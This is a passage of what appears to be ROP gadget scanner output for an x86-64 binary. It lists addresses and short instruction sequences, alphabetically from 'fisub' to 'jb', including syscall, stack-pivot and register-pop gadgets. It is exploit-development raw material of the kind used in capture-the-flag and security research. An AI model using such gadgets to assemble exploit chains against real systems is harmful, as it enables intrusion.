0x000000000046083c : fisub dword ptr [rbx] ; add byte ptr [rax + 0x39], cl ; ret
0x000000000041f5b1 : fisub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041f2b1 : fisub word ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000452de2 : fld dword ptr [rbp - 0x77] ; ret 0x8b4c
0x000000000040f722 : fld qword ptr [rax - 0x78] ; cmp al, 0x30 ; ret
0x000000000046e69b : fld qword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x149
0x00000000004903e1 : fld qword ptr [rsi + 0x32] ; mov bh, 0xb4 ; mov edi, dword ptr [rdx] ; ret
0x000000000045fde2 : fld st(5) ; std ; xlatb ; rol ch, cl ; std ; xlatb ; ret
0x000000000041d659 : fldenv [rsi + 0xf] ; je 0x41d6b6 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000041d937 : fldenv [rsi + 0xf] ; je 0x41d994 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x000000000041f631 : fldenv [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041d551 : fldenv [rsi + 0xf] ; xlatb ; ret
0x0000000000455e2c : fldpi ; stosd dword ptr [rdi], eax ; mov eax, 1 ; ret
0x000000000046f094 : fmul dword ptr [rax + 0x11] ; rcr byte ptr [rbp + 0x5b], 1 ; ret
0x0000000000409e6f : fmul dword ptr [rax - 0x77] ; ret
0x0000000000443d3e : fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x00000000004599e8 : fmul dword ptr [rbp + 0x63] ; ret
0x0000000000456966 : fmul dword ptr [rdi] ; ret
0x0000000000416d69 : fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x000000000042b28f : fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x00000000004168cf : fnsave dword ptr [rdi] ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x00000000004726bb : fnstcw word ptr [rax + 0x489066ff] ; add esp, 8 ; ret
0x0000000000406269 : fpatan ; ret
0x000000000041f3b1 : frstor dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004900c7 : fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x0000000000490440 : fstp st(0) ; ret 0xde5d
0x000000000043b6f8 : fsub dword ptr [rcx + rcx*4 + 1] ; or rax, 0xffffffffffffffff ; ret
0x000000000043b788 : fsub dword ptr [rcx + rcx*4 + 2] ; mov eax, 0xffffffff ; ret
0x000000000041f6b1 : fsub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000433434 : fsub dword ptr [rsi + 0xf] ; xlatb ; ret
0x0000000000438cdb : fsub qword ptr [rsi + 0xf] ; jmp 0x438ca7
0x000000000041f4b1 : fsub qword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000043262c : fsub qword ptr [rsi + 0xf] ; xlatb ; ret
0x0000000000492118 : fucom st(5) ; loop 0x492171 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x0000000000463f97 : fucomi st(0) ; ret
0x00000000004019a7 : fucomip st(0) ; ret
0x00000000004757c1 : fucomip st(1) ; ret
0x000000000049bfdc : hlt ; add al, 0xfd ; call rdx
0x000000000043d41b : hlt ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004904c8 : hlt ; jmp 0x49049d
0x0000000000426fba : hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000421c6e : hlt ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004383d3 : hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00000000004009ca : hlt ; nop dword ptr [rax + rax] ; ret
0x0000000000490603 : hlt ; stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x00000000004383d7 : hlt ; sub eax, edx ; ret
0x000000000044c06c : idiv bh ; call rax
0x000000000044ce05 : idiv bh ; jmp qword ptr [rax]
0x0000000000442386 : idiv byte ptr [rdx - 1] ; cmovs eax, edx ; ret
0x000000000044c391 : idiv edi ; call qword ptr [rax]
0x000000000044c26e : idiv edi ; dec dword ptr [rax - 0x39] ; ret 0x2c20
0x0000000000458008 : idiv edi ; dec dword ptr [rax - 0x77] ; ret
0x000000000045736a : idiv edi ; inc dword ptr [rcx - 1] ; push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x0000000000496c5e : idiv edi ; ret 2
0x000000000047d749 : idiv edx ; call rax
0x0000000000458007 : idiv rdi ; dec dword ptr [rax - 0x77] ; ret
0x000000000040249d : imul al ; popfq ; and eax, 0x89480001 ; ret 0x8548
0x000000000047ce38 : imul byte ptr [rbx - 0x54790006] ; cli ; call qword ptr [rsi]
0x000000000047afc8 : imul byte ptr [rbx - 8] ; jmp rsi
0x000000000049aa85 : imul eax, dword ptr [rax], 0 ; mov byte ptr [rsi - 4], al ; jmp qword ptr [rbx]
0x0000000000436f31 : imul eax, dword ptr [rcx], 0 ; add dh, dh ; ret 0x7502
0x000000000040a444 : imul ebp, dword ptr [rcx], 0 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000047afc9 : imul edi, eax, -1 ; out 0x6b, al ; clc ; call rsi
0x000000000047c66a : imul esp, dword ptr [rdi + 0x6e], 0x8000000 ; xchg eax, esp ; stc ; jmp qword ptr [rax]
0x00000000004363ac : imul esp, dword ptr [rsi + 0xf], 0x74 ; ret 0xff3
0x000000000049aa84 : imul rax, qword ptr [rax], 0 ; mov byte ptr [rsi - 4], al ; jmp qword ptr [rbx]
0x000000000049992c : in al, 0x18 ; sti ; call qword ptr [rdx]
0x0000000000475cb3 : in al, 0x22 ; add byte ptr [rax], cl ; ret
0x0000000000413739 : in al, 0x64 ; mov dword ptr [rax], 0xc ; jmp 0x41370f
0x00000000004330bc : in al, 0x74 ; or dword ptr [rax - 1], ecx ; ret 0xc148
0x000000000043df03 : in al, 0x80 ; cli ; cmp eax, 0x83491774 ; ret
0x0000000000493004 : in al, 0xc9 ; std ; call qword ptr [rbx]
0x000000000047de3c : in al, 0xd6 ; sti ; call rsp
0x000000000047de38 : in al, 0xd6 ; sti ; jmp rsp
0x000000000044c990 : in al, 0xf ; lahf ; ret
0x0000000000426f9a : in al, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043a04e : in al, 0xf3 ; ret
0x000000000048c380 : in al, 0xfd ; cld ; jmp rsp
0x000000000048c3a8 : in al, 0xfd ; cld ; lcall [rbp + rdi*8 - 4] ; jmp rsp
0x000000000048c3e0 : in al, 0xfd ; cld ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x000000000044ce43 : in al, dx ; add dword ptr [rax - 0x93b43], eax ; jmp qword ptr [rax]
0x000000000044cc71 : in al, dx ; add dword ptr [rbp - 0x7b], eax ; in al, 0xf ; lahf ; ret
0x00000000004421ff : in al, dx ; and eax, 0x4e8d4800 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8b01
0x0000000000495844 : in al, dx ; ja 0x495841 ; call qword ptr [rdx]
0x000000000040c1b1 : in al, dx ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000421c6a : in al, dx ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042739a : in al, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000478407 : in al, dx ; or al, ch ; ret 0xf8df
0x0000000000410152 : in al, dx ; or byte ptr [rax - 0x75], cl ; or byte ptr [r8 - 0x77], r9b ; ret 0x8348
0x0000000000413787 : in al, dx ; or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000041cb64 : in al, dx ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000046dc37 : in al, dx ; or byte ptr [rbp + 0x39], cl ; ret
0x0000000000499928 : in al, dx ; pop rcx ; add byte ptr [rax], al ; in al, 0x18 ; sti ; call qword ptr [rdx]
0x00000000004780a9 : in al, dx ; sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret
0x00000000004974b1 : in al, dx ; stc ; jmp qword ptr [rbx]
0x0000000000499f95 : in al, dx ; sti ; call rax
0x0000000000447b1c : in al, dx ; sub byte ptr [rbx + rcx*4 + 0x35], cl ; push rbx ; ret
0x0000000000491b5e : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x491af1 ; ret 0x48f
0x0000000000491b5d : in al, dx ; xchg eax, esp ; push rsi ; cli ; push 0x6e ; ja 0x491af2 ; ret 0x48f
0x0000000000490263 : in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x000000000046f362 : in eax, 0x48 ; mov eax, esi ; ret
0x000000000048f4f9 : in eax, 0x6a ; mov eax, 0x45155e93 ; ret 0x591c
0x00000000004765ea : in eax, 0x83 ; call qword ptr [rcx]
0x0000000000492119 : in eax, 0xe2 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x0000000000461093 : in eax, 0xf ; je 0x4610b8 ; add rax, 2 ; ret
0x000000000043a509 : in eax, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x000000000042701a : in eax, 0xf3 ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000040c066 : in eax, 0xff ; dec dword ptr [rax + 0x39] ; ret
0x00000000004915e1 : in eax, 0xff ; lahf ; mov dh, 0xc7 ; ret 0xe71f
0x0000000000416a5b : in eax, 2 ; cmovne rax, rdx ; ret
0x000000000043b5ff : in eax, dx ; and dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret 0xffe9
0x000000000047a31f : in eax, dx ; jne 0x47a301 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000047a542 : in eax, dx ; jne 0x47a531 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000047aa1c : in eax, dx ; jne 0x47aa07 ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000438bf2 : in eax, dx ; lea rax, [rcx - 1] ; ret
0x0000000000421a7a : in eax, dx ; mov qword ptr [rdi - 0xb], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000401b21 : in eax, dx ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042741a : in eax, dx ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x0000000000474935 : in eax, dx ; pop rbx ; mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000474072 : in eax, dx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000040d2e2 : in eax, dx ; ret
0x0000000000438d42 : in eax, dx ; sub rax, 1 ; ret
0x0000000000439058 : inc bl ; cmp dl, 1 ; jb 0x43906a ; mov byte ptr [rdi], cl ; ret
0x000000000043b3c1 : inc byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x0000000000468322 : inc byte ptr [rbp - 0xfd8a01] ; ror byte ptr [rax - 0x7d], 1 ; ret
0x000000000043eb02 : inc byte ptr [rbx] ; add byte ptr [rax + 0xf], cl ; ret
0x00000000004484c5 : inc byte ptr [rbx] ; je 0x4484d5 ; ret
0x000000000046ac58 : inc dword ptr [r9 + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047d813 : inc dword ptr [rax + 0x49] ; sti ; call qword ptr [rax + 0x20fffb4a]
0x000000000047e1bf : inc dword ptr [rax + rbx*8 - 0x277b0005] ; sti ; call rsp
0x000000000047e1c3 : inc dword ptr [rax + rbx*8 - 0x292b0005] ; sti ; call rsp
0x000000000047d7e3 : inc dword ptr [rax - 0x2f0004c7] ; cmp bh, bl ; jmp qword ptr [rax]
0x000000000047d2ff : inc dword ptr [rax - 0x2f] ; cli ; call rax
0x000000000047ce07 : inc dword ptr [rax - 0x56] ; cli ; call rax
0x000000000047c67f : inc dword ptr [rax - 0x5f00066c] ; xchg eax, esp ; stc ; call rax
0x000000000047d017 : inc dword ptr [rax - 0x62] ; cli ; jmp rsi
0x000000000047d993 : inc dword ptr [rax - 0x67000435] ; retf ; sti ; call rax
0x0000000000457688 : inc dword ptr [rax - 0x90f43] ; jmp qword ptr [rax]
0x000000000044d351 : inc dword ptr [rax - 0x93b43] ; jmp qword ptr [rax]
0x000000000043a4af : inc dword ptr [rax] ; add byte ptr [rax], al ; cmove rax, rcx ; pop rbx ; ret
0x000000000041fbc7 : inc dword ptr [rax] ; add byte ptr [rax], al ; sub eax, ecx ; ret
0x000000000047d73b : inc dword ptr [rax] ; int1 ; cli ; call qword ptr [rax]
0x000000000047cdf7 : inc dword ptr [rax] ; lodsb al, byte ptr [rsi] ; cli ; call qword ptr [rax + 0x20fffaab]
0x000000000047d2ef : inc dword ptr [rax] ; sar edx, cl ; call qword ptr [rax + 0x20fffad2]
0x00000000004676e2 : inc dword ptr [rbp + 0x5b0275c0] ; ret
0x000000000046777f : inc dword ptr [rbp + 0x5b0e78c0] ; ret
0x000000000047d25b : inc dword ptr [rbp + rdx*8 - 6] ; call rsp
0x000000000047b1a7 : inc dword ptr [rbp - 0x52] ; clc ; jmp qword ptr [rcx]
0x000000000046d88c : inc dword ptr [rbp - 0x76b08a40] ; ret
0x0000000000400897 : inc dword ptr [rbx + 0x438d01c1] ; call rbx
0x0000000000405c43 : inc dword ptr [rbx - 0x2f7cfe08] ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000478619 : inc dword ptr [rbx - 0x38b7f808] ; ret 0xffff
0x000000000044f93a : inc dword ptr [rbx - 0x53343] ; call qword ptr [rax]
0x0000000000449378 : inc dword ptr [rbx - 0x76be0008] ; ret 0x840f
0x00000000004089fe : inc dword ptr [rbx - 0x7af0fe08] ; ret
0x0000000000476813 : inc dword ptr [rbx - 0x7bf0bf1e] ; ret
0x000000000044d2cc : inc dword ptr [rbx - 0x8f743] ; call qword ptr [rax]
0x000000000043a56d : inc dword ptr [rbx] ; div ecx ; pop rbx ; mov eax, eax ; ret
0x000000000043a4db : inc dword ptr [rbx] ; pop rbx ; ret
0x000000000046ac59 : inc dword ptr [rcx + 0x10] ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000045805a : inc dword ptr [rcx + 0xf] ; mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x0000000000403ef8 : inc dword ptr [rcx + 0xf] ; xchg eax, ebp ; ret
0x0000000000454d2d : inc dword ptr [rcx + 0xf] ; xchg eax, esp ; ret 0x76e9
0x000000000044e829 : inc dword ptr [rcx + 1] ; int 0x80
0x0000000000444553 : inc dword ptr [rcx - 0x45] ; add eax, 0xe9000000 ; ret 0xfffc
0x0000000000446cfa : inc dword ptr [rcx - 0x77] ; ret 0x17e9
0x000000000044937b : inc dword ptr [rcx - 0x77] ; ret 0x840f
0x000000000045736c : inc dword ptr [rcx - 1] ; push rbp ; cmp byte ptr [rax + 0x39], cl ; ret
0x000000000047d3c7 : inc dword ptr [rdx - 0x30] ; cli ; call rdx
0x000000000047cecf : inc dword ptr [rdx - 0x57] ; cli ; call rdx
0x000000000047d3b7 : inc dword ptr [rdx] ; sar dl, cl ; call qword ptr [rdx + 0x22fffad1]
0x000000000047cebf : inc dword ptr [rdx] ; stosd dword ptr [rdi], eax ; cli ; call qword ptr [rdx + 0x22fffaaa]
0x0000000000431ded : inc dword ptr [rip - 0x7cb80000] ; ret 0x4910
0x000000000047d48b : inc dword ptr [rsi + rax*8] ; cli ; push qword ptr [rbp + rax*8 - 6] ; jmp rsp
0x000000000047cd63 : inc dword ptr [rsi + rbp*4 - 6] ; call rsp
0x000000000047d323 : inc dword ptr [rsi - 0x2c] ; cli ; call rsi
0x000000000047ce2b : inc dword ptr [rsi - 0x53] ; cli ; call rsi
0x00000000004783f2 : inc dword ptr [rsi*2 + 0x8b80f] ; add byte ptr [rax], al ; ret
0x000000000047ce1b : inc dword ptr [rsi] ; scasd eax, dword ptr [rdi] ; cli ; call qword ptr [rsi + 0x26fffaae]
0x000000000047d7f3 : inc eax ; sti ; call qword ptr [rax]
0x000000000047d8df : inc eax ; xchg eax, ebx ; sti ; call rax
0x000000000047d8b7 : inc eax ; xchg eax, edx ; sti ; call rax
0x000000000041e51c : inc ebp ; std ; xlatb ; ret 0xe883
0x000000000046c97c : inc ebx ; mov eax, 1 ; ret
0x000000000045e7fc : inc ebx ; nop ; xor eax, eax ; ret
0x00000000004388c9 : inc ebx ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000047ce4b : inc esi ; test eax, 0xa956fffa ; cli ; jmp rsi
0x0000000000416b4b : insb byte ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000048c4e4 : insb byte ptr [rdi], dx ; add ch, bh ; jmp rsp
0x000000000048c4e0 : insb byte ptr [rdi], dx ; add ch, bh ; ljmp [rax + rax - 3] ; jmp rsp
0x000000000041d2e4 : insb byte ptr [rdi], dx ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000478c4b : insb byte ptr [rdi], dx ; and al, 8 ; jmp 0x478c67
0x000000000047afb9 : insb byte ptr [rdi], dx ; clc ; call qword ptr [rsi]
0x000000000049211e : insb byte ptr [rdi], dx ; insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x000000000048c364 : insb byte ptr [rdi], dx ; std ; cld ; jmp rsp
0x000000000048c378 : insb byte ptr [rdi], dx ; std ; cld ; ljmp [rbp + rdi*8 - 4] ; jmp rsp
0x0000000000416860 : insb byte ptr [rdi], dx ; xor dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000041675b : insd dword ptr [rdi], dx ; add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000049ac9d : insd dword ptr [rdi], dx ; add byte ptr [rax], al ; rcl byte ptr [rdi - 4], 1 ; jmp qword ptr [rbx]
0x000000000049ac3d : insd dword ptr [rdi], dx ; add byte ptr [rax], al ; xor byte ptr [rsi - 4], cl ; jmp rdx
0x000000000046c2cf : insd dword ptr [rdi], dx ; cmp eax, 0x89490000 ; ret
0x000000000049211f : insd dword ptr [rdi], dx ; pop rbx ; ret 0x6f9
0x00000000004904cd : insd dword ptr [rdi], dx ; ret 0xb9b9
0x00000000004913df : insd dword ptr [rdi], dx ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x000000000044e82c : int 0x80
0x000000000046d9bd : int 0xff
0x00000000004057e9 : int1 ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x0000000000460ab6 : int1 ; call rbx
0x000000000047d73d : int1 ; cli ; call qword ptr [rax]
0x0000000000438fdb : int1 ; jl 0x43902c ; adc dword ptr [rsi - 1], edx ; ret
0x0000000000438ffc : int1 ; jl 0x43904d ; adc dword ptr [rsi - 1], edx ; ret
0x000000000043900f : int1 ; jl 0x439060 ; adc dword ptr [rsi - 1], edx ; ret
0x00000000004390e4 : int1 ; jl 0x439135 ; adc dword ptr [rsi - 1], edx ; ret
0x000000000043913c : int1 ; jl 0x43918d ; adc dword ptr [rsi + 3], edx ; ret
0x00000000004391d9 : int1 ; jl 0x43922a ; adc dword ptr [rsi + 7], edx ; ret
0x000000000043a465 : int1 ; jmp rcx
0x000000000045e61b : int1 ; jne 0x45e616 ; lea eax, [rdx + rdi] ; ret
0x000000000046a177 : int1 ; jne 0x46a155 ; mov eax, dword ptr [rcx] ; ret
0x000000000043a589 : int1 ; mov eax, eax ; ret
0x0000000000426e0b : int1 ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042223f : int1 ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004383a3 : int1 ; movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x000000000043a570 : int1 ; pop rbx ; mov eax, eax ; ret
0x000000000043d9d2 : int1 ; pop rdx ; pop r10 ; ret
0x0000000000491af6 : int1 ; ret 0x5803
0x00000000004383a7 : int1 ; sub eax, edx ; ret
0x000000000047d311 : iretd ; cli ; call qword ptr [rax]
0x000000000047d255 : iretd ; cli ; call rsp
0x0000000000400896 : iretd ; inc dword ptr [rbx + 0x438d01c1] ; call rbx
0x00000000004054fd : ja 0x4054de ; mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000042ad13 : ja 0x42ad17 ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00000000004364f7 : ja 0x4364fd ; ret
0x0000000000436513 : ja 0x43651d ; mov dword ptr [rdi], ecx ; ret
0x0000000000436554 : ja 0x436563 ; mov qword ptr [rdi], rcx ; ret
0x00000000004365d9 : ja 0x4365ed ; ret
0x000000000043662f : ja 0x436647 ; ret
0x00000000004366b1 : ja 0x4366cd ; ret
0x0000000000436b17 : ja 0x436b21 ; lea rax, [rdi + 2] ; ret
0x0000000000436b33 : ja 0x436b41 ; mov dword ptr [rdi], ecx ; lea rax, [rdi + 4] ; ret
0x0000000000436b84 : ja 0x436b97 ; mov qword ptr [rdi], rcx ; lea rax, [rdi + 8] ; ret
0x0000000000436c69 : ja 0x436c81 ; lea rax, [rdi + 0x10] ; ret
0x0000000000436cdf : ja 0x436cfb ; lea rax, [rdi + 0x14] ; ret
0x0000000000436d61 : ja 0x436d81 ; lea rax, [rdi + 0x18] ; ret
0x00000000004392e4 : ja 0x439315 ; jb 0x4392f6 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000439644 : ja 0x43968a ; jb 0x439656 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000439a94 : ja 0x439af2 ; jb 0x439aa6 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000043a063 : ja 0x43a080 ; jb 0x43a06f ; mov byte ptr [rdi], cl ; ret
0x000000000043a1d1 : ja 0x43a208 ; jb 0x43a1e0 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000043a399 : ja 0x43a3de ; jb 0x43a3a8 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000043b77b : ja 0x43b783 ; ret
0x000000000043b7c9 : ja 0x43b7d3 ; ret
0x000000000043b9d4 : ja 0x43ba33 ; ret
0x000000000043ba6a : ja 0x43ba73 ; ret
0x000000000043baa7 : ja 0x43bb03 ; ret
0x000000000043bb3d : ja 0x43bb4b ; ret
0x000000000043bb6d : ja 0x43bb7b ; ret
0x000000000043bd77 : ja 0x43bdbb ; ret
0x000000000043bded : ja 0x43bdfb ; ret
0x000000000043c546 : ja 0x43c553 ; ret
0x000000000043dc32 : ja 0x43dc56 ; ret
0x000000000043e2d0 : ja 0x43e2fd ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x000000000043ef85 : ja 0x43efd9 ; movsxd rax, dword ptr [rbx + rax*4] ; add rax, rbx ; jmp rax
0x000000000044a733 : ja 0x44a743 ; ret
0x0000000000451672 : ja 0x451655 ; mov eax, r9d ; ret
0x0000000000461579 : ja 0x461547 ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x0000000000461c3b : ja 0x461c43 ; ret
0x0000000000461c8f : ja 0x461c9b ; ret
0x0000000000461fd0 : ja 0x461ffb ; ret
0x000000000046df5e : ja 0x46dfb0 ; shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x0000000000477fad : ja 0x477fb6 ; sbb eax, eax ; ret
0x0000000000491b64 : ja 0x491aeb ; ret 0x48f
0x0000000000495845 : ja 0x495840 ; call qword ptr [rdx]
0x000000000040bbc8 : jae 0x40bbd5 ; movzx eax, byte ptr [rax] ; ret
0x000000000040ee1d : jae 0x40ee45 ; movzx eax, byte ptr [rax] ; ret
0x000000000043b6ed : jae 0x43b6f2 ; ret
0x000000000043c77d : jae 0x43c782 ; ret
0x000000000043c7ad : jae 0x43c7b2 ; ret
0x000000000043c7dd : jae 0x43c7e2 ; ret
0x000000000043d920 : jae 0x43d925 ; ret
0x000000000043d94d : jae 0x43d952 ; ret
0x000000000043dc24 : jae 0x43dc0b ; ret
0x000000000044a4de : jae 0x44a525 ; xor eax, eax ; pop rbx ; ret
0x0000000000461bbd : jae 0x461bc2 ; ret
0x000000000046b3cb : jae 0x46b375 ; xor eax, eax ; ret
0x0000000000472a34 : jae 0x472a17 ; mov eax, 1 ; ret
0x0000000000472ead : jae 0x472eb2 ; ret
0x0000000000478f36 : jae 0x478f49 ; mov rdx, qword ptr [r15] ; mov rdi, r13 ; call r14
0x0000000000490122 : jae 0x490104 ; jo 0x4901a0 ; mov ebp, 0xfb67d10d ; ret
0x0000000000490fbe : jae 0x490f99 ; push rsi ; pop rdx ; je 0x490f8e ; ret 0xacfc
0x000000000040f721 : jb 0x40f707 ; mov byte ptr [rax + rsi], dil ; ret
0x0000000000415e69 : jb 0x415e7a ; mov qword ptr [rdx], rbx ; mov rax, r10 ; pop rbx ; ret
0x000000000042024a : jb 0x42025a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042039a : jb 0x4203aa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004204ea : jb 0x4204fa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042063a : jb 0x42064a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042078a : jb 0x42079a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004208da : jb 0x4208ea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420a2a : jb 0x420a3a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420b7a : jb 0x420b8a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420cca : jb 0x420cda ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420e1a : jb 0x420e2a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000420f6a : jb 0x420f7a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004210ba : jb 0x4210ca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042120a : jb 0x42121a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042135a : jb 0x42136a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004214aa : jb 0x4214ba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000422c1a : jb 0x422c2a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000422d6a : jb 0x422d7a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000422eba : jb 0x422eca ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042300a : jb 0x42301a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042315a : jb 0x42316a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004232aa : jb 0x4232ba ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004233fa : jb 0x42340a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042354a : jb 0x42355a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042369a : jb 0x4236aa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004237ea : jb 0x4237fa ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042393a : jb 0x42394a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423a8a : jb 0x423a9a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423bda : jb 0x423bea ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423d2a : jb 0x423d3a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000423e7a : jb 0x423e8a ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000042a8ee : jb 0x42a8fa ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000439045 : jb 0x439054 ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x0000000000439050 : jb 0x439063 ; mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x000000000043905d : jb 0x439065 ; mov byte ptr [rdi], cl ; ret
0x0000000000439264 : jb 0x43926d ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004392e6 : jb 0x4392f4 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00000000004392e5 : jb 0x4392f5 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000439646 : jb 0x439654 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x0000000000439a96 : jb 0x439aa4 ; movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000043a065 : jb 0x43a06d ; mov byte ptr [rdi], cl ; ret
0x000000000043a1d3 : jb 0x43a1de ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x000000000043a39b : jb 0x43a3a6 ; mov byte ptr [rdi], cl ; vzeroupper ; ret
0x0000000000450eda : jb 0x450e67 ; ret 0x349
0x000000000045f279 : jb 0x45f28a ; mov qword ptr [rdx], rbx ; mov rax, r10 ; pop rbx ; ret
